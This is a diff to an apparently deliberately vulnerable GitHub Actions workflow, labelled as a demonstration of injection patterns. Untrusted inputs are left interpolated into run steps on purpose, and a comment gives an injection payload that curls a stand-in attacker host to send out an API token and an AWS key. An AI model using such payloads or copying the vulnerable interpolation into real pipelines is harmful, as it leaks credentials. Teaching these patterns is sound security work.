@@ -54,16 +54,20 @@ jobs:
           git commit -m "Update ${{ inputs.package_name }} to ${{ inputs.package_version }}"
         # ⚠️ VULNERABLE: Commit messages with untrusted input
 
-      - name: Send notification (VULNERABLE PATTERN 6 - Direct Secret Usage)
+      - name: Send notification (VULNERABLE PATTERN 6 - Secret in Environment)
+        env:
+          API_TOKEN: ${{ secrets.DEMO_SECRET }}
+          AWS_KEY: ${{ secrets.DEMO_AWS_KEY }}
         run: |
-          curl -X POST "https://hooks.example.com/notify" \
-            -H "Authorization: Bearer ${{ secrets.DEMO_SECRET }}" \
-            -d "package=${{ inputs.package_name }}" \
-            -d "version=${{ inputs.package_version }}" \
-            -d "status=updated"
-        # ⚠️ CRITICAL: Secrets used DIRECTLY in run command with untrusted input
-        # This is extremely dangerous - both the secret AND input are in the same interpolation context
-        # Attack: package_name = '$(curl https://attacker.com?token=${{ secrets.DEMO_SECRET }})'
+          echo "Sending notification for package: ${{ inputs.package_name }}"
+          echo "API Token available: ${API_TOKEN:0:10}..."
+          # In real scenario:
+          # curl -X POST "https://hooks.example.com/notify" \
+          #   -H "Authorization: Bearer $API_TOKEN" \
+          #   -d "package=${{ inputs.package_name }}"
+        # ⚠️ CRITICAL: Secrets in env: block, but input still uses direct interpolation
+        # Attack: package_name = '$(curl https://attacker.com?token=$API_TOKEN&aws=$AWS_KEY)'
+        # The command substitution can access secrets from env:
 
       - name: AWS Deploy (VULNERABLE PATTERN 7 - Direct Secret in Command)
         run: |
